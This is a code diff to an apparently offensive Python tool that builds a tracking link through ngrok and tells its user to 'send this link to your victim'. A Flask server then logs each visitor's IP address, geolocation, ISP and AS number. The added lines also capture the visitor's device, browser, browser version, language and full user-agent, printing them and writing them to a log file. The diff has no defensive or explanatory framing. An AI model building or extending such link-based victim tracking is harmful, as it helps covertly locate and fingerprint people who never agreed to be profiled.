@@ -5,12 +5,14 @@ from style.colors import style
 
 from datetime import datetime
 
+from pyngrok.conf import PyngrokConfig
 from pyngrok import ngrok
 
 
 
 def ngrokServer():
-    ngrok_url = ngrok.connect(80, 'http')
+    config = PyngrokConfig(region = "au") #Change region here if you would like to
+    ngrok_url = ngrok.connect(80, 'http', pyngrok_config = config)
     print(style.GREEN('[+]')  + style.RESET(f' Send this link to your victim: {ngrok_url} '))
 
 def logFile():
@@ -54,6 +56,11 @@ def flaskServer(redirect):
                 isp         = resp['isp']
                 org         = resp['org']
                 AS          = resp['as']
+                device = request.user_agent.platform.title()
+                browser = request.user_agent.browser.title()
+                browser_v = str(request.user_agent.version)
+                language = request.user_agent.language
+                user_agent = str(request.user_agent)
 
                 logFile()
                 with open(logFile.log_file, 'w') as f:
@@ -95,6 +102,22 @@ def flaskServer(redirect):
 
                     print(str(style.YELLOW(' [-]') + style.RESET(f' AS: {AS}')))
                     f.write(str(f' AS: {AS}\n'))
+
+                    print(str(style.YELLOW(' [-]') + style.RESET(f' Device: {device}')))
+                    f.write(str(f' Device: {device}\n'))
+
+                    print(str(style.YELLOW(' [-]') + style.RESET(f' Browser: {browser}')))
+                    f.write(str(f' Browser: {browser}\n'))
+
+                    print(str(style.YELLOW(' [-]') + style.RESET(f' Browser Version: {browser_v}')))
+                    f.write(str(f' Browser Version: {browser_v}\n'))
+
+                    print(str(style.YELLOW(' [-]') + style.RESET(f' User-Agent language:: {language}')))
+                    f.write(str(f' User-Agent language:: {language}\n'))
+
+                    print(str(style.YELLOW(' [-]') + style.RESET(f' User-Agent:: {user_agent}')))
+                    f.write(str(f' User-Agent:: {user_agent}\n'))
+
 
             else:
                 print(style.GREEN('[+]') + style.RESET(f' {ip_} connected again'))
